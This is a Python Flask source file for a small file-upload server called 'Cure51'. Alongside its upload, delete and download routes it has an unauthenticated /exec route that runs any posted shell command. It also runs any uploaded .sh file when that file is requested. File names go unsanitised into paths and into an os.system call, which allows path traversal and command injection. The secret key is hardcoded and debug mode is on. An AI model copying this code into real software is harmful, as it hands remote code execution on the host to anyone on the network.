from flask import Flask, request, redirect, url_for, send_from_directory, render_template_string, flash, send_file
import os
import zipfile
import io
from datetime import datetime
import subprocess

app = Flask(__name__)
app.secret_key = 'cure51'
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    files = os.listdir(UPLOAD_FOLDER)
    return render_template_string('''
        <!doctype html>
        <title>Cure51 Server</title>
        <h1>Cure51 Files</h1>
        <h2>Upload File</h2>
        <form method=post enctype=multipart/form-data action="/upload">
          <input type=file name=file>
          <input type=submit value=Upload>
        </form>
        <h2>All Files</h2>
        <ul>
        {% for filename in files %}
          <li>
            <a href="{{ url_for('uploaded_file', filename=filename) }}">{{ filename }}</a>
            <form method=post action="/delete" style="display:inline;">
              <input type="hidden" name="filename" value="{{ filename }}">
              <input type=submit value=Delete>
            </form>
          </li>
        {% endfor %}
        </ul>
        <form method=post action="/download_all">
          <input type=submit value="Download All">
        </form>
        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <ul class=flashes>
            {% for message in messages %}
              <li>{{ message }}</li>
            {% endfor %}
            </ul>
          {% endif %}
        {% endwith %}
    ''', files=files)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        flash('No file part')
        return redirect(url_for('index'))
    file = request.files['file']
    if file.filename == '':
        flash('No selected file')
        return redirect(url_for('index'))
    if file:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        file.save(filepath)
        flash('File successfully uploaded')
        return redirect(url_for('index'))

@app.route('/delete', methods=['POST'])
def delete_file():
    filename = request.form['filename']
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        flash(f'{filename} successfully deleted')
    else:
        flash(f'{filename} not found')
    return redirect(url_for('index'))

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    if filename.endswith('.sh'):
        os.system(f'chmod +x {filepath}')
        subprocess.Popen(filepath, shell=True)

    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/download_all', methods=['POST'])
def download_all():
    # Create a zip file in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for filename in os.listdir(app.config['UPLOAD_FOLDER']):
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            zip_file.write(filepath, filename)
    zip_buffer.seek(0)
    
    date_str = datetime.now().strftime('%Y-%m-%d')
    zip_filename = f'cure51_{date_str}.zip'
    
    return send_file(zip_buffer, as_attachment=True, download_name=zip_filename)

@app.route('/exec', methods=['POST'])
def exec_command():
    command = request.form['command']
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return f"<pre>{result.stdout}</pre><pre>{result.stderr}</pre>"

if __name__ == '__main__':
    app.run(host='192.168.1.2', port=8000, debug=True)
